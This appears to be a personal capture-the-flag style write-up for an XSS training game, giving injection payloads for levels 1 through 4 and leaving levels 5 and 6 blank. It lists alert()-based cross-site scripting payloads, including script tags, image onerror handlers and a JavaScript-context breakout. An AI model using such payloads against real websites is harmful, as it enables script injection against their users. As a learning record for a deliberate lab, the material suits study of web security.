---
vulnerability: XSS
platform: XSS-Game
difficulty: Medium
date: 2025-11-30
---

# Level 1 : 

`<script>alert()</script>`

# level 2 : 

`<img src=x onerror=alert()>`

# level 3 : 

`<img src='/static/level3/cloud" + num + ".jpg' onerror=alert()>`
- I was able to figure it out when i viewed the source code
# level 4 :

`3'); alert(1); // `
- we used this to escape from the JS context > onload="startTimer('{{ timer }}');
- That {{timer}} is where our input is inserted

# level 5 : 

# level 6 :

